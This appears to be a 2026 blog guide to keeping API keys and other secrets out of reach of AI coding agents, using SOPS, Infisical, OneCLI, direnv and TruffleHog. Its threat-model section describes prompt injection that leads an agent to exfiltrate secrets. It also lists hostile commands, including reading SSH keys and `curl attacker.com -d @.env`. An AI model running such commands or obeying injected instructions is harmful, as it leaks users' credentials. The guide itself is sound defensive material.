---
pubDatetime: 2026-06-29T15:00:00Z
title: "Stop Hardcoding API Keys in Your AI Agents: A 2026 Guide to Secret Management"
postSlug: "secure-secret-management-ai-coding-agents-2026"
description: "How to securely store and inject secrets — API keys, WireGuard keys, database passwords — into AI coding assistants and custom agents. Covers SOPS, Infisical, OneCLI, dotenvx, direnv, and TruffleHog with real configs and redundancy strategies."
tags:
  - security
  - ai-agents
  - secret-management
  - devops
  - coding-assistants
  - sops
  - infisical
---

# Stop Hardcoding API Keys in Your AI Agents: A 2026 Guide to Secret Management

> **TL;DR**: Your AI coding assistant has access to your filesystem, your shell, and your network. If your API keys live in `.env` files or hardcoded configs, a single prompt injection or leaked conversation exfiltrates everything. Here's how to build a zero-secrets-on-disk architecture using open-source GitHub tools, with redundancy built in.

## The Problem

Every AI coding agent — Claude Code, OpenCode, Cursor, Copilot, custom LangChain agents — needs credentials. API keys for LLM providers. Database passwords. Cloud provider tokens. WireGuard private keys. MCP server authentication. SSH keys for deployment.

The default approach most developers use:

```bash
# .env — the nuclear launch code in plain text
OPENAI_API_KEY=sk-proj-abc123...
ANTHROPIC_API_KEY=sk-ant-api03-xyz...
DATABASE_URL=postgres://user:pass@db:5432/prod
WG_PRIVATE_KEY=YK8v...
```

This file sits on disk. Your AI agent can read it. If an attacker compromises your agent via prompt injection — and this is a **real, documented attack vector** — the first thing they do is `cat .env` or read your shell history.

The industry has known about `.env` insecurity for years. But AI agents make the attack surface dramatically worse because they *actively read your files and execute commands*. A web app doesn't go looking for secrets. An AI agent does.

## The Architecture

Here's the target state:

```
┌─────────────────────────────────────────────┐
│         SECRET STORES (redundant)            │
│                                             │
│  ┌────────────┐    ┌───────────────────┐    │
│  │ 1Password  │    │ SOPS + age        │    │
│  │  / Bitwarden│   │ (encrypted files  │    │
│  │  (cloud)   │    │  in git, offline) │    │
│  └──────┬─────┘    └──────┬────────────┘    │
│         │                  │                 │
├─────────┴──────────────────┴─────────────────┤
│         INJECTION LAYER                      │
│                                             │
│  ┌────────────┐    ┌───────────────────┐    │
│  │  direnv    │    │ Infisical CLI     │    │
│  │ (.envrc)   │    │ infisical run     │    │
│  └──────┬─────┘    └──────┬────────────┘    │
│         │                  │                 │
├─────────┴──────────────────┴─────────────────┤
│         CONSUMERS                            │
│                                             │
│  OpenCode │ MCP servers │ Custom agents     │
│  Cursor   │ Cron jobs   │ Docker services   │
└─────────────────────────────────────────────┘
```

**Key principle**: Secrets never touch disk in plaintext. They're resolved at runtime from an encrypted store and injected into the process environment. The AI agent sees environment variables but can't trace them back to a stored file.

---

## GitHub Solutions Compared

The open-source ecosystem has matured significantly. Here are the tools worth your time, ranked by relevance to AI agent workflows:

### 1. SOPS + age — The Git-Native Approach

**[getsops/sops](https://github.com/getsops/sops)** ⭐ 22.2k · Go · MPL-2.0 · CNCF Sandbox

SOPS (Secrets OPerationS) encrypts the *values* in your config files while leaving the *keys* readable. You get files that look like this:

```yaml
# secrets/ai-agents.sops.yaml
openai_api_key: ENC[AES256_GCM,data:abc123...,iv:xyz...,tag:def...,type:str]
anthropic_api_key: ENC[AES256_GCM,data:ghi789...,iv:uvw...,tag:rst...,type:str]
database_url: ENC[AES256_GCM,data:postgres://...,iv:...,tag:...,type:str]
wireguard_private_key: ENC[AES256_GCM,data:YK8v...,iv:...,tag:...,type:str]
```

The keys are visible (so you know what's in the file), but the values are encrypted. You commit these files to git. Decryption happens at runtime using a local key.

Pair it with **[age](https://github.com/FiloSottile/age)** (the modern PGP replacement) instead of GPG — age is simpler, has no key servers, and generates keys in seconds:

```bash
# Generate an age keypair
age-keygen -o ~/.config/sops/age/keys.txt
# Public key printed to stdout — share this with your team

# Configure SOPS to use age
cat > .sops.yaml << 'EOF'
creation_rules:
  - path_regex: secrets/.*\.yaml$
    age: age1xy9...your-public-key...
  - path_regex: secrets/.*\.json$
    age: age1xy9...your-public-key...
EOF

# Encrypt a secrets file (opens editor, encrypts on save)
sops secrets/ai-agents.yaml

# Decrypt at runtime
sops -d secrets/ai-agents.yaml | yq '.openai_api_key'
```

**Why it works for AI agents**: Files are safe to commit. The age private key lives on your machine (or in a password manager), not in the repo. You can diff encrypted files, track changes, and roll back. Works fully offline — no cloud dependency.

**Redundancy**: The encrypted files are in git (backed up infinitely). The age private key should be stored in a password manager or printed and stored in a physical safe. If your machine dies, you clone the repo and import the key.

### 2. Infisical — The Self-Hosted Vault

**[Infisical/infisical](https://github.com/Infisical/infisical)** ⭐ 27.6k · TypeScript/Go · MIT

Infisical is what you reach for when you've outgrown SOPS. It's a full secret management platform — self-hostable, with a dashboard, secret versioning, rotation policies, and SDKs for every language.

```bash
# Self-host with Docker
git clone https://github.com/Infisical/infisical && cd infisical
cp .env.example .env
docker compose -f docker-compose.prod.yml up

# CLI injection — wraps any process
infisical run -- opencode
infisical run -- python my-agent.py
infisical run -- docker compose up
```

The killer feature for AI agents: **[Agent Vault](https://github.com/Infisical/agent-vault)** — a proxy that brokers API access so agents never hold real credentials. Your agent gets a placeholder token; the proxy swaps it for the real key on the outbound request. Even if the agent is compromised via prompt injection, the attacker only gets a useless placeholder.

**Why it works for AI agents**: Centralized management, per-environment secrets (dev/staging/prod), audit logs showing who accessed what and when. The `infisical run` wrapper is process-scoped — secrets exist only in the process memory, not on disk.

**Redundancy**: Infisical supports PostgreSQL replication. Secret versioning means you can roll back to any point in time. Cloud offering available as failover if your self-hosted instance goes down.

### 3. OneCLI — Built Specifically for AI Agents

**[onecli/onecli](https://github.com/onecli/onecli)** ⭐ 2.4k · TypeScript/Rust · Apache-2.0

OneCLI is the newest entrant and the most purpose-built for the AI agent problem. It's a Rust gateway that sits between your agents and the APIs they call:

```
AI Agent → OneCLI Gateway → External API
              ↓
         Swaps FAKE_KEY for REAL_KEY
         (agent never sees real key)
```

```bash
# Install
curl -fsSL https://onecli.sh/install | sh

# Store a secret
# (via dashboard at localhost:10254)

# Point your agent's HTTP proxy to the gateway
export HTTPS_PROXY=http://localhost:10255
export HTTP_PROXY=http://localhost:10255

# Agent makes normal HTTP calls with fake keys
# Gateway intercepts, injects real credentials, forwards
```

**Why it works for AI agents**: This is the only tool designed specifically for the agent threat model. Even if an agent is fully compromised — prompt injection, code execution, filesystem access — it cannot extract real credentials because they're never in the agent's process memory. The gateway holds them encrypted (AES-256-GCM) and decrypts only at the moment of outbound request.

**Redundancy**: Secrets stored encrypted in PostgreSQL. Multi-agent support with scoped access tokens. Bitwarden integration for credential sourcing.

### 4. dotenvx — The Upgraded dotenv

**[dotenvx/dotenvx](https://github.com/dotenvx/dotenvx)** ⭐ 5.6k · JavaScript · MIT

From the creator of dotenv — the library that started the `.env` convention. dotenvx adds encryption:

```bash
# Encrypt your .env
dotenvx encrypt

# .env now contains encrypted values
# .env.keys contains the decryption keys (gitignore this!)

# Decrypt at runtime
dotenvx run -- opencode
```

**Why it works for AI agents**: If you're already using dotenv (and most Node.js projects are), this is the lowest-friction upgrade. Your existing `.env` workflow doesn't change — you just add an encryption layer. The decryption keys live in `.env.keys`, which you store separately (password manager, CI/CD secret, etc.).

**Redundancy**: Encrypted `.env` files are safe to commit. Keys can be distributed via any OOB channel.

### 5. Teller — The Unified Secrets CLI

**[tellerops/teller](https://github.com/tellerops/teller)** ⭐ 3.2k · Rust

Teller aggregates secrets from multiple providers — Vault, AWS Secrets Manager, Google Secret Manager, Azure Key Vault, etcd, Consul, `.env` files — into a single interface:

```bash
# teller.yml — declare your sources
providers:
  vault:
    env_sync:
      path: secret/data/ai-agents
  aws:
    env_sync:
      path: production/ai-keys

# Inject into any process
teller run -- opencode
teller run -- python agent.py
```

**Why it works for AI agents**: If you already have secrets scattered across cloud providers, Teller unifies them without requiring migration. The `teller run` wrapper injects everything into the process environment.

---

## The Injection Layer: direnv

Regardless of which store you choose, **[direnv](https://direnv.net)** is the bridge that makes everything transparent. It hooks into your shell and loads/unloads environment variables based on your current directory:

```bash
# Install
apt install direnv  # or brew install direnv
eval "$(direnv hook bash)"  # add to ~/.bashrc

# Create .envrc at your project root
cat > .envrc << 'EOF'
# Primary: pull from 1Password
export OPENAI_API_KEY=$(op read "op://Homelab/openai/credential" 2>/dev/null)

# Fallback: decrypt from SOPS if 1Password is unavailable
if [ -z "$OPENAI_API_KEY" ]; then
  export OPENAI_API_KEY=$(sops -d secrets/ai-keys.yaml 2>/dev/null | yq -r '.openai_key')
fi

# MCP server tokens
export MCP_GITHUB_TOKEN=$(op read "op://Homelab/github/mcp_token" 2>/dev/null)
export MCP_BRAVE_API_KEY=$(op read "op://Homelab/brave/api_key" 2>/dev/null)

# WireGuard (loaded but never written to disk)
export WG_PRIVATE_KEY=$(op read "op://Homelab/wireguard/private" 2>/dev/null)
EOF

direnv allow  # authorize once
```

Now when you `cd` into the project, every tool launched from that directory — `opencode`, `cursor`, `python agent.py`, `docker compose up` — gets secrets injected. When you leave, they're unloaded. No `.env` files. No hardcoded keys.

The fallback pattern above gives you automatic redundancy: if 1Password is down, SOPS takes over. If both are down, you probably have bigger problems.

---

## Scanning: Catch Leaks Before They Ship

Even with the best architecture, humans make mistakes. A developer pastes a key into a config file "just for testing." A commit message accidentally includes a token. You need automated scanning.

### TruffleHog

**[trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog)** ⭐ 26.9k · Go

TruffleHog scans git repos, Docker images, S3 buckets, and more for leaked credentials — and crucially, it *verifies* findings against live APIs to eliminate false positives:

```bash
# Scan your entire git history
trufflehog git file://./ --results=verified,unknown

# Scan a specific commit
trufflehog github --repo=https://github.com/yourorg/yourrepo

# Install as a pre-commit hook
trufflehog git file://./ --since-commit HEAD --only-verified
```

Add to `.pre-commit-config.yaml`:

```yaml
repos:
  - repo: https://github.com/trufflesecurity/trufflehog
    rev: v3.90.0
    hooks:
      - id: trufflehog
        args: ['--only-verified', '--fail-verified', '--results=verified,unknown']
```

### Infisical Scan (built-in)

If you're using Infisical, scanning is built into the CLI — no separate tool needed:

```bash
# Scan current directory
infisical scan --verbose

# Install as pre-commit hook
infisical scan install --pre-commit-hook
```

Detects 140+ secret types including OpenAI keys, Anthropic keys, AWS credentials, database URLs, and private keys.

---

## Redundancy Strategy

Single points of failure in secret management are unacceptable. Here's how to architect for resilience:

| Component | Primary | Backup | Offline? |
|-----------|---------|--------|----------|
| **Secret storage** | 1Password / Infisical | SOPS + age in git | SOPS always works offline |
| **Injection** | direnv + `op read` / `infisical run` | direnv + `sops -d` | SOPS path works fully offline |
| **API keys** | Live in vault | Encrypted copy in SOPS repo | Both cached locally after first access |
| **WG/VPN keys** | Password manager | SOPS `secrets/wg.yaml` | SOPS file always available |
| **Scanning** | TruffleHog pre-commit | Infisical scan in CI | Both run independently |

The `.envrc` fallback pattern is the key. Every secret resolution should have a try-primary / catch-backup structure:

```bash
# Robust pattern — try multiple sources
export API_KEY=$(
  op read "op://Vault/service/key" 2>/dev/null || \
  sops -d secrets/keys.yaml 2>/dev/null | yq -r '.api_key' || \
  infisical secrets get API_KEY --plain 2>/dev/null || \
  echo "FATAL: No secret source available" && exit 1
)
```

---

## Complete Working Example

Here's a full setup for an OpenCode-based development environment:

### Step 1: Install tools

```bash
# Core tools
apt install direnv age
pip install yq

# SOPS
curl -LO https://github.com/getsops/sops/releases/download/v3.9.0/sops-v3.9.0.linux.amd64
mv sops-v3.9.0.linux.amd64 /usr/local/bin/sops
chmod +x /usr/local/bin/sops

# 1Password CLI (optional but recommended)
brew install 1password-cli  # or apt equivalent
op signin

# TruffleHog
brew install trufflehog  # or download from GitHub releases
```

### Step 2: Create encrypted secrets

```bash
mkdir -p ~/projects/my-agent/secrets
cd ~/projects/my-agent/secrets

# Generate age key
age-keygen -o ~/.config/sops/age/keys.txt
# Copy the public key from output

# SOPS config
cat > ../.sops.yaml << 'EOF'
creation_rules:
  - path_regex: secrets/.*\.yaml$
    age: age1YOUR_PUBLIC_KEY_HERE
EOF

# Create and encrypt secrets
cat > ai-keys.yaml << 'EOF'
openai_api_key: sk-proj-YOUR_KEY_HERE
anthropic_api_key: sk-ant-api03-YOUR_KEY_HERE
database_url: postgres://user:pass@localhost:5432/db
grafana_token: glsa_YOUR_TOKEN
EOF

sops -e ai-keys.yaml  # encrypts in place
# Now safe to git commit
```

### Step 3: Set up direnv

```bash
cd ~/projects/my-agent

cat > .envrc << 'EOF'
# Load secrets from SOPS (works offline)
eval "$(sops -d secrets/ai-keys.yaml | yq -o=shell)"

# Override with 1Password if available (freshest source)
if command -v op &>/dev/null && op signed-in &>/dev/null 2>&1; then
  export OPENAI_API_KEY=$(op read "op://Homelab/openai/key" 2>/dev/null || echo "$OPENAI_API_KEY")
  export ANTHROPIC_API_KEY=$(op read "op://Homelab/anthropic/key" 2>/dev/null || echo "$ANTHROPIC_API_KEY")
fi
EOF

direnv allow
```

### Step 4: Launch your agent

```bash
cd ~/projects/my-agent
# Secrets are now in environment — no files to leak
opencode
# or
cursor .
# or
python -m my_agent
```

### Step 5: Add leak prevention

```bash
# Pre-commit hook
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
trufflehog git file://./ --since-commit HEAD --only-verified --fail-verified
EOF
chmod +x .git/hooks/pre-commit
```

---

## Tool Comparison Matrix

| Tool | GitHub Stars | Best For | AI-Agent Specific? | Self-Hosted? | Offline? |
|------|-------------|----------|-------------------|--------------|----------|
| **[SOPS](https://github.com/getsops/sops)** | 22.2k | Git-tracked encrypted secrets | No | N/A (files) | ✅ |
| **[Infisical](https://github.com/Infisical/infisical)** | 27.6k | Full secret platform + Agent Vault | ✅ Agent Vault | ✅ Docker | Partial |
| **[OneCLI](https://github.com/onecli/onecli)** | 2.4k | Gateway-based credential injection | ✅ Purpose-built | ✅ Docker | ✅ |
| **[dotenvx](https://github.com/dotenvx/dotenvx)** | 5.6k | Upgrading existing dotenv projects | No | N/A (files) | ✅ |
| **[Teller](https://github.com/tellerops/teller)** | 3.2k | Multi-provider aggregation | No | N/A (CLI) | Depends |
| **[TruffleHog](https://github.com/trufflesecurity/trufflehog)** | 26.9k | Leak scanning + verification | No | N/A (CLI) | ✅ |
| **[git-secret](https://github.com/sobolevn/git-secret)** | 4.0k | GPG-based git secrets | No | N/A (files) | ✅ |
| **[OpenBao](https://github.com/openbao/openbao)** | 6.5k | HashiCorp Vault fork (post-license-change) | No | ✅ | ✅ |

---

## What Not To Do

```bash
# ❌ Hardcoded in config files
# opencode.json
{ "apiKey": "sk-ant-api03-..." }

# ❌ Plain .env committed to git
echo "OPENAI_API_KEY=sk-..." >> .env
git add .env  # never do this

# ❌ In docker-compose.yml
environment:
  - DB_PASSWORD=plaintext123

# ❌ In skill files or agent system prompts
# (agents can read their own configs)

# ❅ In shell history
export API_KEY=sk-...  # now in ~/.bash_history

# ❌ Passed as CLI arguments
opencode --api-key sk-...  # visible in ps aux
```

---

## The Threat Model

Why does this matter specifically for AI agents? Because AI agents represent a fundamentally new attack surface:

1. **Prompt injection**: A malicious website, file, or MCP server can inject instructions into your agent's context. The agent, believing these are legitimate user instructions, will happily read and exfiltrate secrets.

2. **Tool abuse**: Agents have filesystem access, shell access, and network access. A compromised agent can `cat ~/.ssh/id_rsa`, `env | grep KEY`, or `curl attacker.com -d @.env`.

3. **Conversation leaks**: Agent conversations are often logged, synced to cloud, or shared. If secrets appear in the conversation (even in "thinking" traces), they're compromised.

4. **Supply chain**: MCP servers, skills, and agent plugins run arbitrary code. A malicious plugin can enumerate and exfiltrate environment variables.

The architecture above mitigates all four:
- Secrets are in process memory only during execution, not in readable files
- Gateway-based approaches (OneCLI, Infisical Agent Vault) ensure agents never hold real keys at all
- Scanning catches accidental leaks before they ship
- Audit logging (Infisical) provides forensic capability

---

## Recommendations by Scenario

| You Are... | Primary Tool | Why |
|------------|-------------|-----|
| **Solo developer** | SOPS + age + direnv | Zero infrastructure, works offline, files in git |
| **Small team (2-10)** | Infisical (self-hosted) + direnv | Dashboard, versioning, secret rotation |
| **Team with AI agents** | OneCLI or Infisical Agent Vault | Agents never touch real keys |
| **Enterprise** | Infisical (cloud or self-hosted) + OpenBao | RBAC, audit logs, PAM, compliance |
| **Already on dotenv** | dotenvx | Drop-in upgrade, minimal change |
| **Multi-cloud** | Teller | Aggregate from all providers |

---

## Conclusion

The `.env` file has been a security liability for a decade. AI coding agents turn that liability into an active threat. The tools to fix this exist today — they're open-source, well-maintained, and battle-tested.

The minimum viable security upgrade is two steps:

1. **`sops -e` your secrets files and commit them to git**
2. **Install direnv and load secrets at runtime instead of from `.env`**

That's it. Two commands. Your AI agents go from reading plaintext keys off disk to only seeing decrypted values in process memory.

If you're running production AI agents, add OneCLI or Infisical Agent Vault as a gateway layer. Your agents should never know the real credentials — they should only know that their HTTP requests somehow work.

---

*Tools referenced: [SOPS](https://github.com/getsops/sops) · [Infisical](https://github.com/Infisical/infisical) · [OneCLI](https://github.com/onecli/onecli) · [dotenvx](https://github.com/dotenvx/dotenvx) · [Teller](https://github.com/tellerops/teller) · [TruffleHog](https://github.com/trufflesecurity/trufflehog) · [age](https://github.com/FiloSottile/age) · [direnv](https://direnv.net) · [OpenBao](https://github.com/openbao/openbao) · [git-secret](https://github.com/sobolevn/git-secret)*
